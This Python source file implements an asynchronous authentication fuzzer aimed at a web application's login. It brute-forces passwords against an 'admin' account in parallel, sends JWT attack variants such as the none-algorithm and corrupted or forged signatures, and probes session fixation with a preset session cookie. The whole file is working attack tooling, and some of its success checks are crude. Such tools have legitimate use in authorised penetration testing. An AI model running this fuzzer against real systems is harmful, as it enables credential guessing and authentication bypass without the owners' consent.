import asyncio, time, os
from typing import Optional
import httpx
from tqdm.asyncio import tqdm
from fuzzer.reporter import Reporter
from fuzzer.payloads_manager import gather_passwords, header_payloads, jwt_payloads, sample
from fuzzer.jwt_utils import jwt_none_alg, corrupt_signature, forge_with_key

class SimpleAuthFuzzer:
    def __init__(self, base_url:str, login_path:str, username_field:str="username", password_field:str="password",
                 username:str="admin", concurrency:int=10, timeout:int=10, reporter:Reporter=None):
        self.base_url = base_url.rstrip("/")
        self.login_path = login_path
        self.username_field=username_field
        self.password_field=password_field
        self.username=username
        self.concurrency=concurrency
        self.timeout=timeout
        self.reporter=reporter or Reporter()

    async def _post(self, client: httpx.AsyncClient, path:str, data:dict, headers:dict=None):
        url = f"{self.base_url}{path}"
        return await client.post(url, data=data, headers=headers or {}, timeout=self.timeout)

    async def run_password_mode(self, max_attempts:int=200):
        pwds = gather_passwords(limit=max_attempts)
        sem = asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(follow_redirects=True) as client:
            tasks=[]
            for pwd in pwds:
                tasks.append(self._attempt_password(client, pwd, sem))
            for f in tqdm.as_completed(tasks, total=len(tasks)):
                await f
        self.reporter.save()

    async def _attempt_password(self, client, pwd, sem):
        async with sem:
            t0=time.time()
            try:
                r = await self._post(client, self.login_path, {self.username_field:self.username, self.password_field:pwd})
                body = r.text
                ok = (r.status_code in (200,302)) and ("dashboard" in body.lower() or "logout" in body.lower() or "set-cookie" in r.headers.keys())
                self.reporter.add({"mode":"password", "username":self.username, "password":pwd, "status":r.status_code, "len":len(body), "ok":ok, "duration":time.time()-t0})
            except Exception as e:
                self.reporter.add({"mode":"password", "username":self.username, "password":pwd, "error":str(e), "duration":time.time()-t0})

    async def run_jwt_mode(self, token_field="Authorization", sample_count=200):
        toks = jwt_payloads()
        toks = sample(toks, sample_count)
        sem = asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(follow_redirects=True) as client:
            tasks=[ self._attempt_jwt(client, t, sem, token_field) for t in toks ]
            for f in tqdm.as_completed(tasks, total=len(tasks)):
                await f
        self.reporter.save()

    async def _attempt_jwt(self, client, token, sem, token_field):
        async with sem:
            t0=time.time()
            try:
                # test variations
                variants=[token, jwt_none_alg(token), corrupt_signature(token)]
                for v in variants:
                    headers={token_field: f"Bearer {v}"} if not v.startswith("Cookie:") else {}
                    r = await client.get(self.base_url+"/", headers=headers)
                    ok = (r.status_code in (200,302)) and ("logout" in (r.text or "").lower())
                    self.reporter.add({"mode":"jwt", "token_variant":v[:80], "status":r.status_code, "len":len(r.text or ""), "ok":ok, "duration":time.time()-t0})
            except Exception as e:
                self.reporter.add({"mode":"jwt", "error":str(e), "duration":time.time()-t0})

    async def run_session_fixation(self, sid_header="Cookie", sid_value="PHPSESSID=fixme", max_attempts=100):
        sem=asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(follow_redirects=True) as client:
            tasks=[]
            for _ in range(max_attempts):
                tasks.append(self._attempt_fixation(client, sid_header, sid_value, sem))
            for f in tqdm.as_completed(tasks, total=len(tasks)):
                await f
        self.reporter.save()

    async def _attempt_fixation(self, client, sid_header, sid_value, sem):
        async with sem:
            t0=time.time()
            try:
                r1 = await client.get(self.base_url+"/", headers={sid_header: sid_value})
                r2 = await self._post(client, self.login_path, {self.username_field:self.username, self.password_field:"dummy"})
                cookies_after = client.cookies.jar if hasattr(client, "cookies") else client.cookies
                ok = sid_value.split("=")[1] in str(cookies_after)
                self.reporter.add({"mode":"fixation", "pre_cookie":sid_value, "login_status":getattr(r2,"status_code",None), "ok":ok, "duration":time.time()-t0})
            except Exception as e:
                self.reporter.add({"mode":"fixation", "error":str(e), "duration":time.time()-t0})
